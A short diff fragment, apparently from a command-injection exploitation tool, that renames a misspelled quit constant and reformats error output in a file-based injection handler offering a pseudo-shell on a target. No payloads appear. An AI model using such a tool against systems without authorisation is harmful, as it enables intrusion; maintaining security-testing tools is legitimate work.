-                if menu.options.verbose:
-                  print ""
+              elif gotshell in settings.CHOICE_NO:
                 if checks.next_attack_vector(technique, go_back) == True:
                   break
                 else:
@@ -466,7 +609,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                   else:
                     return True  
 
-              elif gotshell in settings.CHOISE_QUIT:
+              elif gotshell in settings.CHOICE_QUIT:
                 # Delete previous shell (text) files (output)
                 delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 sys.exit(0)
@@ -474,7 +617,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
               else:
                 if gotshell == "":
                   gotshell = "enter"
-                print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
+                print Back.RED + settings.ERROR_SIGN + "'" + gotshell + "' is not a valid answer." + Style.RESET_ALL + "\n"
                 pass
             
           except KeyboardInterrupt: 
